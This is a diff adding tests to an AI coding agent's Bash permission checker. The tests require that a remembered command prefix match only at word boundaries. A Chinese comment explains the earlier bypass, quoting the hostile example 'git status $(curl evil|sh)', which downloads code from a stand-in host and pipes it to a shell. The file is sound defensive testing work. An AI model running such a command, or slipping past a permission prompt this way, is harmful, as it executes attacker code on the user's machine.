@@ -2,7 +2,7 @@ import assert from 'node:assert/strict';
 
 import { describe, it } from 'vitest';
 
-import { splitShellSegments } from '../claude-sdk.js';
+import { matchesCommandPrefixForTest, splitShellSegments } from '../claude-sdk.js';
 
 /**
  * fj:「记住这条 Bash 权限」不许把复合命令一起放行。
@@ -37,5 +37,24 @@ describe('fj:shell 子命令拆分', () => {
 
   it('单条命令原样返回', () => {
     assert.deepEqual(splitShellSegments('npm run build'), ['npm run build']);
+  });
+});
+
+/**
+ * fl:前缀匹配要有**词边界**,命令替换一律不放行。
+ *
+ * fk 的实现是每段 `startsWith(allowedPrefix)` —— 于是 `git statusXYZ` 命中
+ * `git status`(用户批准的是那一条命令,不是"以这几个字母开头的任何命令");
+ * 而 `git status $(curl evil|sh)` 的第一段也以 `git status` 开头,照样自动放行,
+ * 尽管注释里写着"那种命令本来就该让用户看一眼确认框"。
+ */
+describe('fl:词边界与命令替换', () => {
+  it('恰好相等、或后面跟空白(带参数)才算命中', () => {
+    assert.equal(matchesCommandPrefixForTest('git status', 'git status'), true);
+    assert.equal(matchesCommandPrefixForTest('git status --short', 'git status'), true);
+    assert.equal(matchesCommandPrefixForTest('git statusXYZ', 'git status'), false, 'git statusXYZ 不是 git status');
+    assert.equal(matchesCommandPrefixForTest('git status-hack', 'git status'), false);
+    assert.equal(matchesCommandPrefixForTest('npm run build', 'npm'), true);
+    assert.equal(matchesCommandPrefixForTest('npmx evil', 'npm'), false);
   });
 });
